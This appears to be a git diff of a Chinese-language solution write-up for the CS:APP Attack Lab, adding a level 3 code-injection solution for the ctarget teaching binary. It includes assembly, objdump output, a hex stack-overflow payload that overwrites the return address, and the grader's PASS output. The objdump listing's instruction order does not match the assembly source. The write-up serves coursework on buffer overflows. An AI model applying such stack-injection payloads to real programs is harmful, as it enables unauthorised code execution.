@@ -10,7 +10,9 @@
 
 【任务】利用上述漏洞，植入攻击代码，改变程序行为。[此处](http://csapp.cs.cmu.edu/3e/attacklab.pdf)可下载详细说明。
 
-## 第一关
+## `ctarget`
+
+### 第一关
 
 函数 `getbuf()` 的 C 代码和汇编码分别为
 
@@ -104,7 +106,7 @@ PASS: Would have posted the following:
         result  1:PASS:0xffffffff:ctarget:1:30 31 32 33 34 35 36 37 38 39 30 31 32 33 34 35 36 37 38 39 30 31 32 33 34 35 36 37 38 39 30 31 32 33 34 35 36 37 38 39 C0 17 40 00 00 00 00 00 
 ```
 
-## 第二关
+### 第二关
 
 需要植入的指令为：
 ```gas
@@ -155,5 +157,77 @@ PASS: Would have posted the following:
         course  15213-f15
         lab     attacklab
         result  1:PASS:0xffffffff:ctarget:2:90 90 90 90 90 90 90 90 BF FA 97 B9 59 90 90 90 68 EC 17 40 00 90 90 90 C3 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 78 DC 61 55 00 00 00 00 
+```
+
+### 第三关
+
+先用 `man ascii` 查到 `59b997fa` 的十六进制表示：
+
+```
+35 39 62 39 39 37 66 61
+```
+
+与前一关不同，这里不能直接将其写入 `getbuf()` 的帧内，而应将其压入栈内（并补一个空字符），故需植入的指令为：
+
+```gas
+# exploit.s
+pushq $0x0 # 字符串尾
+movabsq $0x6166373939623935, %rdi # 直接压栈无法编译
+pushq %rdi                        # 故分作两步
+movq  %rsp, %rdi # 设置 touch3() 的实参
+pushq $0x4018fa  # touch3() 的地址
+retq
+```
+
+先汇编，再反汇编，得以下输出：
+
+```shell
+$ gcc -c exploit.s && objdump -d exploit.o
+```
+
+得以下输出：
+
+```
+exploit.o:     file format elf64-x86-64
+
+
+Disassembly of section .text:
+
+0000000000000000 <.text>:
+   0:   48 bf 35 39 62 39 39    movabs $0x6166373939623935,%rdi
+   7:   37 66 61 
+   a:   57                      push   %rdi
+   b:   48 89 e7                mov    %rsp,%rdi
+   e:   6a 00                   pushq  $0x0
+  10:   68 fa 18 40 00          pushq  $0x4018fa
+  15:   c3                      retq
+```
+
+只需将前一关的地址略作修改：
+
+```c
+/* exploit.txt */
+/* 0x5561dc78 */ 6a 00 /* pushq $0x0 */
+/* 0x5561dc7a */ 48 bf 35 39 62 39 39 37 66 61 /* movabsq */
+/* 0x5561dc84 */ 57 /* pushq %rdi */
+/* 0x5561dc85 */ 48 89 e7 /* movq %rsp,%rdi */
+/* 0x5561dc88 */ 68 fa 18 40 00 /* pushq $0x4018fa */ 
+/* 0x5561dc8d */ c3 /* retq */ 90 90
+/* 0x5561dc90 */ 90 90 90 90 90 90 90 90
+/* 0x5561dc98 */ 90 90 90 90 90 90 90 90
+/* 0x5561dca0 */ 78 dc 61 55 00 00 00 00
+```
+
+最终得以下输出：
+
+```
+Cookie: 0x59b997fa
+Type string:Touch3!: You called touch3("59b997fa")
+Valid solution for level 3 with target ctarget
+PASS: Would have posted the following:
+        user id bovik
+        course  15213-f15
+        lab     attacklab
+        result  1:PASS:0xffffffff:ctarget:3:6A 00 48 BF 35 39 62 39 39 37 66 61 57 48 89 E7 68 FA 18 40 00 C3 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 78 DC 61 55 00 00 00 00
 ```
 
